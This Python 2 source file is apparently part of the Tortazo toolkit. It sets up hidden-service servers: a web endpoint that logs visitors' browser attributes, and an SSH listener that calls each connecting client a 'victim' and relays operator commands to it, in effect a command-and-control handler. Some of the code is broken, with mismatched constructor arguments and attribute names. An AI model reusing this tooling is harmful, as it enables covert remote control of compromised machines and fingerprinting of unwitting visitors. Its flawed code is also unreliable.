# coding=utf-8
'''
Created on 02/12/2014

#Author: Adastra.
#twitter: @jdaanial

HiddenServices.py

HiddenServices is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

HiddenServices is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''


from twisted.internet import reactor
import sys, os, threading, SocketServer, paramiko, signal,datetime,time
from twisted.internet.endpoints import TCP4ServerEndpoint
import json
from twisted.web import server, resource, static
from plugins.texttable import Texttable

'''
MixIn used to create an TCP Server.
'''
class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): 
    allow_reuse_address = True 

'''
Class used to create a simple web server using the Twisted library.
'''
class SimpleWebServer():

    '''
    Start the web server using the service directory as argument.
    '''
    def start(self, serviceDir, servicePort, serviceInterface):
        root = static.File(serviceDir)
        site = server.Site(root)
        hs_endpoint = TCP4ServerEndpoint(reactor, servicePort, interface=serviceInterface)
        hs_endpoint.listen(site)

'''
Class used to create a custom web server to gather basic infotmation about the user browser.
'''
class SimpleCustomWebServer(resource.Resource):

    '''
    Function used to process the HTTP GET requests. Just prints the information in the console.
    '''
    def render_GET(self, request):
        data = json.loads(request.args['info'][0])
        if data != None:
            table = Texttable()
            table.set_cols_align(["l", "l"])
            table.set_cols_valign(["m", "m"])
            table.set_cols_width([20,25])
            rows= [ ["Browser Attribute", "Value"],
                  ]
            for key, value in data.iteritems():
                rows.append([key, value])
            table.add_rows(rows)
            print table.draw() + "\n"

        request.setHeader("content-type", "text/plain")
        return "Success"

    '''
    Start the web server using the service directory as argument and the resource "SimpleCustomWebServer".
    '''
    def start(self, serviceDir, servicePort, serviceInterface):
        root = static.File(serviceDir)
        root.putChild("gatherUserInfo", SimpleCustomWebServer())
        site = server.Site(root)
        hs_endpoint = TCP4ServerEndpoint(reactor, servicePort, interface=serviceInterface)
        hs_endpoint.listen(site)

class SSHServerInterface(paramiko.ServerInterface): 
    def __init__(self, username, password):
        self.username = username
        self.password = password
		
    def check_channel_request(self, kind, chanid):
        if kind == 'session': 
            return paramiko.OPEN_SUCCEEDED 
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED 
 
    def check_auth_password(self, username, password): 
        if (username == self.username) and (password == self.password): 
            return paramiko.AUTH_SUCCESSFUL 
        return paramiko.AUTH_FAILED 
	
class SSHServerHandler(SocketServer.BaseRequestHandler):

    def __init__(self, user, password, serverKey):
        self.user = user
        self.password = password
        self.serverKey = serverKey

    def handle(self): 
        sshTransport = None 
        try: 
            client = self.request 
            sshTransport = paramiko.Transport(client) 
            sshTransport.load_server_moduli() 
            sshTransport.add_server_key(self.server_key)
            serverInterface = SSHServerInterface() 
            try: 
                sshTransport.start_server(server=serverInterface) 
            except paramiko.SSHException, x: 
                print("Exception raised "+str(x)) 
            except: 
                print(sys.exc_info()) 
            self.chan = sshTransport.accept(200) 
            clientName = self.chan.recv(1024) 
            self.chan.send('SSH Connection Established!') 
            print('\n[+] A new fresh victim! %s ' %(clientName)) 
            os.system('cls' if os.name == 'nt' else 'clear')
            try: 
                input = raw_input 
            except NameError: 
                pass 
            while True: 
                command = input(": ")
                if command.lower() == 'exit' or command.lower() == 'quit':
                    break
                else:
                    self.chan.send(command) 
        except: 
            print(sys.exc_info())
        finally: 
            if sshTransport is not None: 
                sshTransport.close()                   
    
    def finish(self): 
        print("[+]Closing TCP Server") 
        self.server.shutdown() 
	
class SimpleSSHServer():

    def start(self, serverInterface, serverPort, user, password, serverKey ):
        sshHandler = SSHServerHandler(user, password, serverKey)
        self.server = ThreadedTCPServer((serverInterface, serverPort), sshHandler) 
        ip, port = self.server.server_address 
        server_thread = threading.Thread(target=self.server.serve_forever) 
        server_thread.daemon = True 
        server_thread.start() 
        while server_thread.is_alive(): 
            pass 
        signal.signal(signal.SIGALRM, self.__timeout) 
        signal.alarm(1) 
 
    def __timeout(self, signum, frame):
        print("[-]Timing out! Killing the server process") 
        if self.server != None: 
            self.server.shutdown()  
        sys.exit(0)